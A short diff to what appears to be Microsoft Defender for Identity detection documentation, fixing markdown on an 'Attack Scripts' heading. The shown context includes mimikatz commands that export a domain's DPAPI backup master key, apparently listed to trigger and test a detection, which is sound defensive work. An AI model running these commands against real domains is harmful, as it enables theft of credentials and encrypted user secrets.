@@ -27,7 +27,7 @@ POST https://graph.microsoft.com/v1.0/security/runHuntingQuery
 * [MDI Readyness Script](https://github.com/microsoft/Microsoft-Defender-for-Identity/tree/main/Test-MdiReadiness)
 
 ### Attack Scripts
-**Malicious request of Data Protection API (DPAPI) master key
+**Malicious request of Data Protection API (DPAPI) master key**
 ```
 mimikatz # privilege::debug
 mimikatz # lsadump::backupkeys /system:adatumt01.net /export 
